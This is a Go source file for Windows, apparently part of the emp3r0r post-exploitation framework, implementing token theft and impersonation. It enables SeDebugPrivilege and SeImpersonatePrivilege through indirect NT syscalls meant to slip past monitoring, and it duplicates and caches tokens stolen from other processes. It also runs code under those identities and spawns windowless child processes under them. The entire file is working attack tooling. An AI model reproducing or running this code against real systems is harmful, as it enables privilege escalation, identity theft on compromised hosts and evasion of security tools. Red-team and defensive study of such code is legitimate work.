//go:build windows

package priv

import (
	"fmt"
	"runtime"
	"sync"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"golang.org/x/sys/windows"
)

var (
	// modadvapi32 / procLookupPrivilegeName are kept for LookupPrivilegeNameW
	// (display helper with no NT syscall equivalent) and for
	// CreateProcessWithTokenW (NtCreateUserProcess requires complex
	// RTL_USER_PROCESS_PARAMETERS plumbing not yet implemented).
	modadvapi32                 = windows.NewLazySystemDLL("advapi32.dll")
	procLookupPrivilegeName     = modadvapi32.NewProc("LookupPrivilegeNameW")
	procLookupPrivilegeValue    = modadvapi32.NewProc("LookupPrivilegeValueW")
	procCreateProcessWithTokenW = modadvapi32.NewProc("CreateProcessWithTokenW")

	TokenMap = &sync.Map{} // cached stolen tokens (SID → windows.Handle)

	// Track which privileges have already been enabled on this process.
	enabledPrivs sync.Map
)

type SECURITY_QUALITY_OF_SERVICE struct {
	Length              uint32
	ImpersonationLevel  uint32
	ContextTrackingMode byte
	EffectiveOnly       byte
}

// ---------------------------------------------------------------------------
// Privilege helpers
// ---------------------------------------------------------------------------

// EnablePrivilege enables the named privilege (e.g. "SeDebugPrivilege") on
// the current process token via NtAdjustPrivilegesToken. Idempotent.
func EnablePrivilege(name string) error {
	if _, already := enabledPrivs.Load(name); already {
		return nil
	}

	table := syscall.RuntimeSyscallTable
	if table == nil {
		return fmt.Errorf("syscall table not initialized")
	}

	// 1. Open current process token (indirect syscall).
	hToken, status, err := syscall.NtOpenProcessToken(
		table,
		windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,
	)
	if err != nil || status != syscall.STATUS_SUCCESS {
		return fmt.Errorf("NtOpenProcessToken: status 0x%08X, %v", status, err)
	}
	defer windows.CloseHandle(hToken)

	// 2. Look up the privilege LUID (advapi32 – no NT syscall equivalent).
	var luid windows.LUID
	nameUTF16, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString: %w", err)
	}
	r1, _, e1 := procLookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(nameUTF16)), uintptr(unsafe.Pointer(&luid)))
	if r1 == 0 {
		return fmt.Errorf("LookupPrivilegeValue(%s): %v", name, e1)
	}

	// 3. Enable via NtAdjustPrivilegesToken (indirect syscall).
	tp := struct {
		Count uint32
		Luid  windows.LUID
		Attr  uint32
	}{
		Count: 1,
		Luid:  luid,
		Attr:  windows.SE_PRIVILEGE_ENABLED,
	}

	status, err = syscall.NtAdjustPrivilegesToken(
		table,
		hToken,
		false, // don't disable all
		unsafe.Pointer(&tp),
		uint32(unsafe.Sizeof(tp)),
		nil, // previous state not needed
		nil, // return length not needed
	)
	if err != nil || status != syscall.STATUS_SUCCESS {
		return fmt.Errorf("NtAdjustPrivilegesToken(%s): status 0x%08X, %v", name, status, err)
	}

	enabledPrivs.Store(name, true)
	return nil
}

// ---------------------------------------------------------------------------
// Token stealing
// ---------------------------------------------------------------------------

// StealToken acquires a duplicated impersonation token from targetPID.
//
// On first call it enables SeDebugPrivilege and SeImpersonatePrivilege.
func StealToken(table *syscall.SyscallTable, targetPID uint32) (windows.Handle, error) {
	if table == nil {
		return 0, fmt.Errorf("syscall table is nil")
	}

	// Ensure required privileges are enabled (idempotent).
	if err := EnablePrivilege("SeDebugPrivilege"); err != nil {
		logging.Warningf("SeDebugPrivilege not available: %v", err)
	}
	if err := EnablePrivilege("SeImpersonatePrivilege"); err != nil {
		logging.Warningf("SeImpersonatePrivilege not available: %v", err)
	}

	// 1. Open handle to target process.
	hProcess, status, err := syscall.NtOpenProcess(table, windows.PROCESS_QUERY_LIMITED_INFORMATION, targetPID)
	if err != nil || status != syscall.STATUS_SUCCESS {
		return 0, fmt.Errorf("NtOpenProcess failed with status 0x%08X: %v", status, err)
	}
	defer windows.CloseHandle(hProcess)

	// 2. Open the process token.
	var tokenAccess uint32 = windows.TOKEN_DUPLICATE | windows.TOKEN_QUERY
	hProcessToken, status, err := syscall.NtOpenProcessToken(table, hProcess, tokenAccess)
	if err != nil || status != syscall.STATUS_SUCCESS {
		return 0, fmt.Errorf("NtOpenProcessToken failed with status 0x%08X: %v", status, err)
	}
	defer windows.CloseHandle(hProcessToken)

	// 3. Duplicate into an impersonation token.
	hDup, err := DuplicateSystemToken(table, hProcessToken)
	if err != nil {
		return 0, fmt.Errorf("DuplicateSystemToken: %w", err)
	}

	return hDup, nil
}

// DuplicateSystemToken duplicates a process token into an impersonation token.
func DuplicateSystemToken(
	table *syscall.SyscallTable,
	hProcessToken windows.Handle,
) (windows.Handle, error) {
	sqos := SECURITY_QUALITY_OF_SERVICE{
		Length:              uint32(unsafe.Sizeof(SECURITY_QUALITY_OF_SERVICE{})),
		ImpersonationLevel:  2, // SecurityImpersonation
		ContextTrackingMode: 1,
		EffectiveOnly:       0,
	}

	objectAttributes := syscall.OBJECT_ATTRIBUTES{
		Length:                   uint32(unsafe.Sizeof(syscall.OBJECT_ATTRIBUTES{})),
		SecurityQualityOfService: uintptr(unsafe.Pointer(&sqos)),
	}

	var dupAccess uint32 = windows.TOKEN_IMPERSONATE | windows.TOKEN_QUERY | windows.TOKEN_DUPLICATE

	hDup, status, err := syscall.NtDuplicateToken(
		table,
		hProcessToken,
		dupAccess,
		&objectAttributes,
		false,
		syscall.TokenImpersonation,
	)
	if err != nil || status != 0 {
		return 0, fmt.Errorf("NtDuplicateToken: status 0x%08X, %v", status, err)
	}

	return hDup, nil
}

// ---------------------------------------------------------------------------
// Impersonation (indirect syscalls)
// ---------------------------------------------------------------------------

// ExecuteAsToken pins the current goroutine to its OS thread, impersonates
// hToken via NtSetInformationThread(ThreadImpersonationToken), calls
// action(), reverts, and unlocks the thread.
func ExecuteAsToken(hImpersonationToken windows.Handle, action func() error) error {
	if syscall.RuntimeSyscallTable == nil {
		return fmt.Errorf("ExecuteAsToken: syscall table not initialized")
	}
	runtime.LockOSThread()

	defer func() {
		// Revert: set NULL token on the current thread.
		status, err := syscall.NtSetInformationThread(
			syscall.RuntimeSyscallTable,
			windows.CurrentThread(),
			syscall.ThreadImpersonationToken,
			nil,
			0,
		)
		if err != nil || status != syscall.STATUS_SUCCESS {
			logging.Warningf("NtSetInformationThread (revert) failed: 0x%08X, %v", status, err)
		}
		runtime.UnlockOSThread()
	}()

	tokenPtr := unsafe.Pointer(&hImpersonationToken)
	status, err := syscall.NtSetInformationThread(
		syscall.RuntimeSyscallTable,
		windows.CurrentThread(),
		syscall.ThreadImpersonationToken,
		tokenPtr,
		uint32(unsafe.Sizeof(hImpersonationToken)),
	)
	if err != nil || status != syscall.STATUS_SUCCESS {
		return fmt.Errorf("NtSetInformationThread (impersonate): 0x%08X, %v", status, err)
	}

	return action()
}

// ImpersonateThread temporarily impersonates hToken on the current OS
// thread. Caller MUST call RevertThread() to restore the previous identity
// and unlock the thread.
func ImpersonateThread(hToken windows.Handle) error {
	if syscall.RuntimeSyscallTable == nil {
		return fmt.Errorf("ImpersonateThread: syscall table not initialized")
	}
	runtime.LockOSThread()

	tokenPtr := unsafe.Pointer(&hToken)
	status, err := syscall.NtSetInformationThread(
		syscall.RuntimeSyscallTable,
		windows.CurrentThread(),
		syscall.ThreadImpersonationToken,
		tokenPtr,
		uint32(unsafe.Sizeof(hToken)),
	)
	if err != nil || status != syscall.STATUS_SUCCESS {
		runtime.UnlockOSThread()
		return fmt.Errorf("ImpersonateThread: 0x%08X, %v", status, err)
	}
	return nil
}

// RevertThread reverts the thread token to the process token and unlocks the
// OS thread locked by ImpersonateThread.
func RevertThread() {
	status, err := syscall.NtSetInformationThread(
		syscall.RuntimeSyscallTable,
		windows.CurrentThread(),
		syscall.ThreadImpersonationToken,
		nil,
		0,
	)
	if err != nil || status != syscall.STATUS_SUCCESS {
		logging.Warningf("RevertThread: 0x%08X, %v", status, err)
	}
	runtime.UnlockOSThread()
}

// ---------------------------------------------------------------------------
// Token information queries (via NtQueryInformationToken)
// ---------------------------------------------------------------------------

// queryTokenInfo is a small helper that does the two-step
// NtQueryInformationToken dance: first call to get required size, second
// call to fill the buffer.
func queryTokenInfo(hToken windows.Handle, infoClass uint32) ([]byte, error) {
	table := syscall.RuntimeSyscallTable
	if table == nil {
		return nil, fmt.Errorf("syscall table not initialized")
	}

	var returnLen uint32
	status, err := syscall.NtQueryInformationToken(table, hToken, infoClass, nil, 0, &returnLen)
	if status != uint32(windows.STATUS_BUFFER_TOO_SMALL) && status != syscall.STATUS_SUCCESS {
		return nil, fmt.Errorf("NtQueryInformationToken size probe: 0x%08X, %v", status, err)
	}
	if returnLen == 0 {
		return nil, fmt.Errorf("NtQueryInformationToken returned zero length")
	}

	buf := make([]byte, returnLen)
	status, err = syscall.NtQueryInformationToken(table, hToken, infoClass, unsafe.Pointer(&buf[0]), uint32(len(buf)), &returnLen)
	if err != nil || status != syscall.STATUS_SUCCESS {
		return nil, fmt.Errorf("NtQueryInformationToken: 0x%08X, %v", status, err)
	}

	return buf[:returnLen], nil
}

// GetTokenUserSid returns the SID string of the user represented by hToken.
func GetTokenUserSid(hToken windows.Handle) (string, error) {
	buf, err := queryTokenInfo(hToken, syscall.TokenUser)
	if err != nil {
		return "", err
	}
	// TOKEN_USER layout: SID_AND_ATTRIBUTES { *SID; ULONG Attributes }
	userSid := *(**windows.SID)(unsafe.Pointer(&buf[0]))
	return userSid.String(), nil
}

// GetTokenFriendlyName resolves a token handle to "DOMAIN\User (SID)".
func GetTokenFriendlyName(hToken windows.Handle) string {
	buf, err := queryTokenInfo(hToken, syscall.TokenUser)
	if err != nil {
		return fmt.Sprintf("<unknown> (%v)", err)
	}
	userSid := *(**windows.SID)(unsafe.Pointer(&buf[0]))
	sidStr := userSid.String()
	account, domain, _, err := userSid.LookupAccount("")
	if err != nil {
		return fmt.Sprintf("%s (lookup failed)", sidStr)
	}
	return fmt.Sprintf("%s\\%s (%s)", domain, account, sidStr)
}

// GetTokenIntegrityLevel returns the mandatory integrity level SID.
func GetTokenIntegrityLevel(hToken windows.Handle) (string, error) {
	buf, err := queryTokenInfo(hToken, syscall.TokenIntegrityLevel)
	if err != nil {
		return "", err
	}
	// TOKEN_MANDATORY_LABEL: { SID_AND_ATTRIBUTES Label }
	labelSid := *(**windows.SID)(unsafe.Pointer(&buf[0]))
	return labelSid.String(), nil
}

// GetTokenPrivileges returns a human-readable list of privileges on hToken.
func GetTokenPrivileges(hToken windows.Handle) ([]string, error) {
	buf, err := queryTokenInfo(hToken, syscall.TokenPrivileges)
	if err != nil {
		return nil, err
	}
	// TOKEN_PRIVILEGES: { ULONG PrivilegeCount; LUID_AND_ATTRIBUTES Privileges[1] }
	count := *(*uint32)(unsafe.Pointer(&buf[0]))
	if count == 0 {
		return nil, nil
	}

	// Each entry is LUID (8 bytes) + Attributes (4 bytes) = 12 bytes.
	type luidAndAttr struct {
		Luid windows.LUID
		Attr uint32
	}
	entries := unsafe.Slice((*luidAndAttr)(unsafe.Pointer(&buf[4])), count)

	var list []string
	for _, e := range entries {
		name, err := lookupPrivilegeName(e.Luid)
		if err != nil {
			continue
		}
		status := "Disabled"
		if e.Attr&windows.SE_PRIVILEGE_ENABLED != 0 {
			status = "Enabled"
		}
		list = append(list, fmt.Sprintf("%s (%s)", name, status))
	}
	return list, nil
}

// lookupPrivilegeName converts a LUID to its string name (advapi32 – display
// helper with no NT syscall equivalent).
func lookupPrivilegeName(luid windows.LUID) (string, error) {
	var nameLen uint32 = 256
	buf := make([]uint16, nameLen)

	r1, _, err := procLookupPrivilegeName.Call(
		0,
		uintptr(unsafe.Pointer(&luid)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&nameLen)),
	)
	if r1 == 0 {
		return "", err
	}

	return windows.UTF16ToString(buf[:nameLen]), nil
}

// ---------------------------------------------------------------------------
// Whoami (current effective identity)
// ---------------------------------------------------------------------------

// Whoami returns "DOMAIN\User (SID)" for the current effective security
// context, checking the thread token first (impersonation) then the process
// token.
func Whoami() (string, error) {
	table := syscall.RuntimeSyscallTable
	if table == nil {
		return "", fmt.Errorf("syscall table not initialized")
	}

	var hToken windows.Handle

	// Try opening the thread token first (handles impersonation).
	hToken, status, err := syscall.NtOpenThreadToken(
		table,
		windows.CurrentThread(),
		windows.TOKEN_QUERY,
		true, // open as self
	)
	if err != nil || status != syscall.STATUS_SUCCESS {
		// Fall back to process token.
		hToken, status, err = syscall.NtOpenProcessToken(
			table,
			windows.CurrentProcess(),
			windows.TOKEN_QUERY,
		)
		if err != nil || status != syscall.STATUS_SUCCESS {
			return "", fmt.Errorf("NtOpenProcessToken: 0x%08X, %v", status, err)
		}
	}
	defer windows.CloseHandle(hToken)

	return GetTokenFriendlyName(hToken), nil
}

// ---------------------------------------------------------------------------
// Child process creation with token
// ---------------------------------------------------------------------------

// CreateProcessWithToken spawns a child process under hToken via
// CreateProcessWithTokenW (advapi32).
//
// TODO: convert to NtCreateUserProcess once RTL_USER_PROCESS_PARAMETERS
// plumbing is implemented.
func CreateProcessWithToken(hToken windows.Handle, commandLine string) error {
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	cmdUTF16, err := windows.UTF16PtrFromString(commandLine)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString: %w", err)
	}

	const logonFlags uint32 = 1 // LOGON_WITH_PROFILE

	r1, _, e1 := procCreateProcessWithTokenW.Call(
		uintptr(hToken),
		uintptr(logonFlags),
		0,
		uintptr(unsafe.Pointer(cmdUTF16)),
		0x04000000, // CREATE_NO_WINDOW
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r1 == 0 {
		err := fmt.Errorf("CreateProcessWithTokenW: %v", e1)
		logging.Warningf("CreateProcessWithToken: %v (SeImpersonatePrivilege may be required)", err)
		return err
	}

	windows.CloseHandle(windows.Handle(pi.Process))
	windows.CloseHandle(windows.Handle(pi.Thread))
	return nil
}
